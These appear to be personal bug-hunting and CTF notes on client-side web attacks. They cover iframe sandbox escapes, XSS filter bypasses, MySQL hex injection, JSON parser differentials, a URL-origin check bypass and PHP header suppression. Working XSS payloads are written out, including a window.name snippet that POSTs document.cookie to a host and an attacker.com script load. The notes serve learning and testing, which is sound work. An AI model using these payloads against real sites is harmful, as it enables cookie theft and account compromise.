# Iframe Security

[critical thinking podcast](https://blog.criticalthinkingpodcast.io/p/abusing-iframes-from-a-client-side-hacker)

## src attribute

- The URL of the page to embed
- Can be same-origin with the parent window, or not
- Potentially sourrounded by quotation marks
- Controlled by `frame-src` in CSP Headers
- Could start with url schemes like `javascript:`, `data:` , `blob:` etc.
    - controlled by `script-src` in CSP headers instead.
- If surrounded by quotes you could [encode](https://mothereff.in/html-entities) the value:
    - Encode with [named characters](https://html.spec.whatwg.org/multipage/named-characters.html) (`&amp;` = `&` etc.)
    - Encode with decimal, such as `&#38`
    - Encode with hexadecimal, such as `&#x26`
    - `<iframe src=" &#x6a;&#65;vAScrIpt&colon;alert&lpar;1&rpar;"></iframe>` (javascript:alert(1) )
- `javascript:` scheme keeps parent's origin ,while `data:` scheme sets it null
    - So the frame canot acceess data on the page.
- it can be a .js url aswell, so you can get XSS


## srcdoc attribute

- Inline HTML to execute
- Has priority over the src attribute
- the window generated by iframe + srcdoc will inherit the origin of the upper layer
    - So it has access to elements in the upper-level window
- The iframe also inherits the CSP applied to the page
- srcdoc is not affected by the `frame-src` of CSP
- Can be HTML Encoded as it is wrapped in quotes.
- `<iframe srcdoc="<script>payload</script>"></iframe>` will trigger even after the page is fully loaded

## csp attribute 

Apart from CSP Headers and meta tags in the upper layer window , an csp attribute can be defined in the `<iframe>` tag  but not every browser supports it.

```
<iframe csp="default-src 'self'; script-src 'none';"
  srcdoc="<script>alert(1)</script>"></iframe>
```

## name attribute

- window.name, name in short, property can carry data between different domains
  - navigating from one domain to another causes most context to be reset
  - window.name can remain unchanged even as the browser tab transitions across sites
```javascript
window.name = 'fetch("http://localhost:9002/data",{method:"POST",mode:"no-cors",body:document.cookie});';
location = "//example.com/en-us/search?query=%3Cscript%3Eeval(name)%3C/script%3E";`
```

## sandbox attribute
When specified:
- Restricts almost all of iframe's functonality
- Nullifies the origin of the iframe
    - Cookies and strorage cannot be accessed
    - Can be altered with `allow-same-origin`,which causes the content to be treated as being from its real origin
- flags starting with `allow-top-navigation*` propably allow upper layer redirection with `top.location='https://`
  - Allows the iframe content to navigate its top-level browsing context
  - Also have access to parent document, `window.parent.alert(origin);`
- `allow-popups-to-escape-sandbox`: Allows popups to open new windows without inheriting the sandboxing
  - when the sandbox value `allow-popups` is set then the opened popup will inherit all the sandboxed attributes unless `allow-popups-to-escape-sandbox` is set
  - opening a popup from a null origin will make `window.origin` inside the popup also [null](https://hacktricks.alquymia.com.br/pentesting-web/postmessage-vulnerabilities/bypassing-sop-with-iframes-1.html#sop-bypass-2-windoworigin--null)
- Trying to xss with `alert()` or `prompt()` in srcdoc will need allow-modals to work.
- the window opened by the sandboxed iframe with `window.open()` inherits the sandbox properties

- Setting `allow-same-origin` and `allow-scripts` , allows us to execute javascript and have access to the upper layer window, and as a result to the iframe element itself.You can completely disable the sandbox property.
```
<iframe
  sandbox="allow-same-origin allow-scripts"
  srcdoc="<script>top.document.querySelector('iframe').removeAttribute('sandbox');location.reload();alert(1)</script>">
</iframe>
```
## Frame origin 

#### Same origin

if the iframe has the same origin with the top level window , its allowed access to window.top.location and redirect the window.

#### Cross-origin 

a cross-origin frame can't immediately redirect the top-level page by default.

#### Cross-origin accessed properties

- “window”
- “self”
- “location”
  - location.href can be used to redirect the webpage to another location, as long as you can access the window.
  - `location.href = 'javascript:alert(1)'` could be used to execute javascript in top level window.
- “close”
- “closed”
- “focus”
- “blur”
- “frames”
- “length”
- “top”
- “opener”
- “parent”
- “postMessage”

## Opening window in sandboxed iframe (nested framing)

- Suppose an iframe with the sandbox atribute set and also some allowed flags in it
- and it trys to open a window with window.open() (so allow-popups must be set)
- the browsing context of the new window ,is inheriting the restrictions aswell the permissions the iframe has.
  - The new opened window/document will also have the sandbox restrictions together with the allowed Options
  - The window's origin will also be null as the sandboxed iframe, regardless the origin of the url opened.
- `allow-popups-to-escape-sandbox` on the other hand , make the popup avoid those restrictions

```html
<!-- iframe.html -->
 <script>alert(1)</script>
```

```html
<iframe
  srcdoc="<script>window.open('iframe.html')</script>"
  sandbox="allow-scripts allow-popups">
</iframe>
```
- Here the alert wont happen , due to the allow-modals not added to the iframe.


## Reading cookies from different sites

You land on `url/siteB` and you want to read cookies set with `Path=/siteA` and `HttpOnly=false`

If you have the ability to embed an iframe you can still the cookies:

```
# url/siteB
const iframe = document.createElement('iframe')
iframe.src = 'https://example.com/siteA'
iframe.onload = () => {
  alert(iframe.contentWindow.document.cookie)
}
document.body.appendChild(iframe)
```
## Iframe navigation and history
- when you perform navigation, the iframe’s history will also be added to the history in your browser (going back in the page will actually make the iframe go back)

```
<body>
  <iframe sandbox id=f src="data:text/html,test1:<script>alert(1)</script>"></iframe>
  <button onclick="loadTest2()">load test2</button>
  <button onclick="location = 'a.html'">top level navigation</button>
</body>
<script>
  function loadTest2() {
    f.removeAttribute('sandbox')
    f.src = 'data:text/html,test2:<script>alert(2)<\/script>'
  }
</script>
```
- First the alert(1) is blocked due to sandboxing
- Then pressing the loadTest2() , the attribute is deleted and the alert(2) in test2 gets executed.
- By pressing the navigation button , the top level window changes location.
- Then press back button.

Pressing back here has 2 possibilities:

### bfcache enabled
[bfcache](https://web.dev/articles/bfcache)

- when the main frame is restored from the bfcache, embedded iframes will be restored as they were when the page entered the bfcache

- If bfcache is enabled the complete state of previous page gets rendered so the sandbox attribute is still gone and the src of iframe is test2.

### bfcache disabled

[issue](https://github.com/whatwg/html/issues/6809)

You can avoid the usage of bfcache by using the following api:

- [WebSocket](https://developer.mozilla.org/docs/Web/API/WebSocket)

- [WebTransport](https://developer.mozilla.org/docs/Web/API/WebTransport)

- [WebRTC](https://developer.mozilla.org/docs/Web/API/WebRTC_API)

There is a feature usefull for user experience that going back in an page, the browser restores the latest context of the page, but the src becomes the latest entry in the history list.

So in the context of the iframe the src will be test2 but the sandbox attribute is still present.

This is called `iframe reparenting`.

remember that when you go back:

-    The sandbox attribute always follows the latest page as it derives from HTTP-cache.
-    The src will be the last loaded webpage (as a convenience for the user).

#### Example of sanbox escaping
[iframe reparenting with bfcache](https://blog.huli.tw/2024/09/07/en/idek-ctf-2024-iframe/#2-iframe-reparenting-and-bfcache)
[bfcache usage](https://developer.chrome.com/docs/web-platform/bfcache-ccns)
```
<body>
  <iframe id=f src="data:text/html,test1:<script>document.writeln(Math.random())</script>"></iframe>
  <button onclick="loadTest2()">load test2</button>
  <button onclick="location = 'a.html'">top level navigation</button>
</body>
<script>
  // to disable bfcache
  const ws = new WebSocket('ws://example.com');
  console.log('run')
  function loadTest2() {
    f.setAttribute('sandbox', '')
    f.src = 'data:text/html,test2:<script>document.writeln(Math.random())<\/script>'
  }
</script>
```

- Before the top level navigation the test1 executes but test2 falls under the sandbox restrictions
- After returning from `a.html` with back button , the attributes of the iframe remain same as the original page , bute the src attribute is the latest one
  - So the context of iframe will be test2 + no sandbox
- this effectively bypasses the usage of sandboxed iframes where the attribute `sandbox` is added in a later stage of loading the page.
- The WebSocket usage acts as a [bfcache buster](https://developer.chrome.com/docs/web-platform/bfcache-ccns)


## Click-jacking Remediations

#### X-Frame-Options

`X-Frame-Options` response header can be used to indicate whether a browser should be allowed to render a page in a `<frame>`, `<iframe>`, `<embed>` or `<object>`.

```
X-Frame-Options: DENY (The page cannot be displayed in a frame)
X-Frame-Options: SAMEORIGIN
X-Frame-Options: ALLOW-FROM origin (Deprecated and ussually ignored) 
```

- Apache configuration

`Header  set X-Frame-Options "DENY"`

- Nginx Configuration

`add_header X-Frame-Options DENY always;`

#### CSP frame-ancestors

Specifies valid parents that may embed a page using `<frame>`, `<iframe>`, `<object>`, or `<embed>`
Setting this directive to 'none' is similar to `X-Frame-Options: deny`

```
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors <source-expression-list>;
```


# Character Length Limits in sinks

## window.location

You could append a hash `#` to the location ,followed by the closing of quotation like ` ' or "` (depenting on the application ) , followed by a semicolon `;` , followed by xss code.

This way the window.location becomes : ` 'https://location.com/#';alert(1)`

You could embed that to the xss paylaod:
```
<svg/onload=eval(`'`+location)>
```

- We write location and **not** document.location or window.location as inline code in event handlers execute in scope of current document.

## location.hash

write your payload directly in the URL after the hash `#`
`http://example.org/#<script>alert(1)</script>`

submit the xss payload to trigger the vulnerability:
`eval(location.hash.slice(1))`


# Bypass character filters


## html attribute separators
If Space  is banned you can bypass this using these characters instead:

|Decimal value |	URL Encoded |	Human desc|
|-----------|---------------|--------------|
47 |	%2F 	|Foward slash
13 |	%0D 	|Carriage Return
12 |	%0C |	Form Feed
10 |	%0A |	New Line
9 |	%09 	|Horizontal Tab


## Parenthesis Blacklisted

you can spawn XSS with template literals:

``<img/src=x onerror=alert`1`/>``


## HTML Encoding

You can use html encoding only outside script tags as those inside it will not be decoded and sent in for javascript execution as is.

`<svg onload=alert&lpar;1&rpar;></svg>`
`<svg onload=alert&#x28;1&#x29></svg>`

[HTML Encoder](https://mothereff.in/html-entities)

## Useful tranformations

#### constructing strings

```
parseInt(“alert”,30)
8680439..toString(30) => 'alert'
```

#### Javascript escapes

```
"\x41" -> "A": hex encoding
"\u0065" -> "A": unicode encoding (value is decimal)
"\101" -> "A": octal encoding
```


## Mysql encodings

- Mysql based applications listening in web for input and passing the strings to queries , could also include [Hexadecimal literals](https://dev.mysql.com/doc/refman/9.1/en/hexadecimal-literals.html)
- Inject strings like 0x27 ("'") or X'27' to bypass filters.
- programming languages, like python, still interpet the strings as normal ascii text ,e.g. `SELECT id, username FROM users WHERE username = ('/') AND password = (') UNION SELECT 1,0x27` , but executing the sql query on the backend , the 0x27 is acting as `'`.

# Event Handlers in HTML tags and theyre usage


|Tag Attribute |	Tags supported 	|Note|
|-------|----------|------------|
onload| 	body, iframe, img, frameset, input, script, style, link, svg 	|Great for 0-click, but super commonly filtered
onpageshow |	body 	|Great for 0-click, but appears only usable in Non-DOM injections
onfocus |	input, select, a 	|for 0-click: use together with autofocus=""
onerror |	img, input, object, link, script, video, audio |	make sure to pass params to make it fail
onanimationstart |	Combine with any element that can be animated 	|Fired then a CSS animation starts
onanimationend |	Combine with any element that can be animated 	|Fires when a CSS animation ends
onstart |	marquee 	|Fires on marquee animation start - Firefox only?
onfinish |	marquee 	|Fires on marquee animation end - Firefox only?
ontoggle |	details 	|Must have the ‘open’ attribute for 0-click
onmessage |	most tags |	postMessage is commonly used to get around iframe restrictions and share data, as a result if your page is doing this you can use onmessage to intercept messages and trigger code
onblur 	|input, select, a 	|Set autofocus="" for an easy 1-click when the user switches focus away from the injected element by clicking on anything on the page



# JSON


## Json duplicate keys

- Some json parsers act differently when it comes to parsing duplicate keys in a json input
- A json library might prefer keep the first occurence, the last occurence, merge all occurences in a set , or just throw an error.
- We could exploit this behaviour in apps using more than one parsers in different componets and subvert application logic

## Json unicode character truncation

- Some json parsers truncate some "illegal" unicode completely, while other leave intact as a string
- Example unicode chars are `\ud800` and `\ud888`

## Json Comments

- Some json libraries support quotless string (keys and values) and also comment text with the use of `/* */`
- An attacker could smuggle duplicate keys if the two lirbaries parsing the string both support quotless strings but dont support comments.

`{"test": 1 ,comm1: /*,"test": 2, comm2: */}`
` {"test": 1 ,comm1:"a"/*,"test": 2, comm2:"b"*/}`



# Javascript

## Unicode line terminators

- Unicode Line and Paragraph separators **U+2028 and U+2029** can be used as line terminators in JavaScript
- For example, `eval('x=123\u2028alert(x)')` will pop out an alert.


## Web API

#### new URL(url,base) constructor

- Passing a single `/` after the scheme has [strange](https://vitorfalcao.com/posts/intigriti-0525-writeup/#checks-vs-usage-a-subtle-difference) results

- `https:@domain/yourscript.js` can also be used

```javascript

// if you check the origin of url parameter with URL(url,location)

//  assuming location.origin is 'https://server.com'
(new URL('https:/attacker.com/hacky.js', location)).origin
// expected: 'https://server.com'


// and then reuse this 'checked' url with URL again

// not specifying {base} parameter
(new URL('https:/attacker.com/hacky.js')).origin
// expected: 'https://attacker.com'
```



# PHP

## PHP Header and data buffering

- PHP is known for when start sending the client body data, it cannot send any header information anymore.
- Any code line that is trying to set a Header at this point, will just get ignored.
- To achieve this you could trigger [php Warnings](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points)

```php
<?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
```

## PHP deafault parameters length

- PHP Handlers have some default variables when they need to parse requests
- These are the maximum request variables php will accept by dedault:
  - $_GET: 1000 parameters 
  - $_POST: 1000 parameters
  - $_FILES: 20 files



```php
>>> resp = requests.get('http://pilv.ar/?' + 'a=&' * 1001)
>>> resp.text
'<br />\n<b>Warning</b>:  PHP Request Startup: Input variables exceeded 1000. To increase the limit change max_input_vars in php.ini. in <b>Unknown</b> on line <b>0</b><br />\n<br />\n<b>Warning</b>:  Cannot modify header information - headers already sent in <b>/var/www/html/index.php</b> on line <b>2</b><br />\n'
>>> resp.headers.get('Content-Security-Policy')
>>>
```

# YAML files

## YAML tags

- Data structures besides the ordinary ones, can be specified in yaml with tags
- Nodes are parsed by their default type if you have no tag annotations.
- Global Tags are standarized across the yaml documents by the specification , generraly containing a URI
- Local Tags are as implied local to the application

#### 6.8.2.1. Tag Handles

- exactly matche the prefix of the affected tag 
- three kind of handles
  - named handles
  - primary handles
  - secondary handles

##### Primary Tag Handle

- The primary tag handle is a single “!” character.
- by default, shorthands using this handle are interpreted as local tags
  - `%TAG !m! !my-`
- If the prefix begins with a character other than “!”,its a global tag,and it must have a valid URI prefix
  - `%TAG !e! tag:example.com,2000:app/`

##### Secondary Tag Handle

-  written as “!!”
-  compact notation for a single “secondary” name space 
- **By default, the prefix associated with this handle is “tag:yaml.org,2002:**


##### Named Handles

- A named tag handle surrounds a non-empty name with “!” characters
- A handle name must not be used in a tag shorthand unless an explicit “TAG” directive has associated some prefix with it
- `%TAG !e! tag:example.com,2000:app/`


##### base64 encoded str tag

[tsukuCTF2025](https://zenn.dev/syurenuko/articles/8bc856d59abdcc?_x_tr_hist=true#%5Bweb%5D-yamlwaf)

```yaml
---
%TAG !b! tag:yaml.org,2002:binary
---
file: !b! |
  ZmxhZy50eHQ=
...

---
picture: !!binary |
 R0lGODlhDAAMAIQAAP//9/X
 17unp5WZmZgAAAOfn515eXv
 Pz7Y6OjuDg4J+fn5OTk6enp
 56enmleECcgggoBADs=
 
 ...
 ```

## Ancors and Aliases

[lactf2026 blogler](https://frederik353.github.io/writeups/ctfs/lactf-26/blogler/)

- You can place Anchors (&) on an entity,and then you can then use an Alias (*) call that anchor later in the document to reference that section
- The Alias essentially acts as a “see above” command, anchors and aliases don’t create copies. They create references to the same object in memory. 

```yaml
definitions: 
  steps:
    - step: &build-test
        name: Build and test
        script:
          - mvn package
        artifacts:
          - target/**

pipelines:
  branches:
    develop:
      - step: *build-test
    master:
      - step: *build-test


```

- You can also tweak the Anchor when called by entering `<<:` before the Alias.
- This way you can extend the data that the alias implys, on top of the data the ancor point to.

```yaml
definitions: 
  steps:
    - step: &build-test
        name: Build and test
        script:
          - mvn package
        artifacts:
          - target/**


pipelines:
  branches:
    develop:
      - step: *build-test
    master:
      - step: 
          <<: *build-test
          name: Testing on Master #override name 
          ongoing: false # new key:value data
```

